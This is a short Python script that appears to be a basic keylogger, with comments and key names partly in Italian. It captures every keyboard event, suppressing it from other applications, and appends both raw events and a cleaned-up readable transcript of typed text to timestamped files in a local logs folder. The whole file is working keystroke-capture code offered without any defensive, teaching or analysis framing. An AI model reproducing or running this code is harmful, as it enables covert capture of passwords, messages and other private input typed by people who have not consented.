from lib import keyboard
from datetime import datetime
import os
import threading

#gloabl var


def checkLogsPath(path):
    if os.path.exists(path) == False:
        os.mkdir(path)

def recording():
    return keyboard.read_event(suppress=True)
    

def calcualteDataAndHour():
    tempTime = datetime.now()
    return str(tempTime.strftime("%Y-%m-%d %H.%M.%S"))

def writeToFileRaw(lPath, lName, l):
    newLog = open(lPath + lName, "a")
    newLog.write(str(l))
    newLog.close()

def writeToFileHuman(strh, lPath, lName):
    if strh.find("down") != -1:
        if strh.find("space") != -1:
            strh = " "
        elif strh.find("enter") != -1:
            strh = "\n"
        elif strh.find("maiusc") != -1:
            strh = ""
        elif strh.find("ctrl") != -1:
            strh = " [CTRL] "
        elif strh.find("esc") != -1:
            strh = " [ESC] "
        elif strh.find("stamp") != -1:
            strh = " [STAMP] "
        elif strh.find("bloc maius") != -1:
            strh = " [MAIUSCOLO] "
        else:
            strh = strh.removeprefix("KeyboardEvent(")
            strh = strh.removesuffix(" down)\n")
    else:
        return 0
    newLog = open(lPath + lName, "a")
    newLog.write(strh)
    newLog.close()

def main():
    tempLogName = calcualteDataAndHour()
    logsPath = "logs/"
    checkLogsPath(logsPath)

    while True:
        tempLog = recording()
        strh = str(tempLog)

        writeToFileRaw(logsPath,tempLogName+".raw",strh + "\n")

        thread_write_human = threading.Thread(target=writeToFileHuman, args=(strh + "\n", logsPath, tempLogName+".txt"))
        thread_write_human.start()



#########################
if __name__== "__main__":
   main()                
#########################
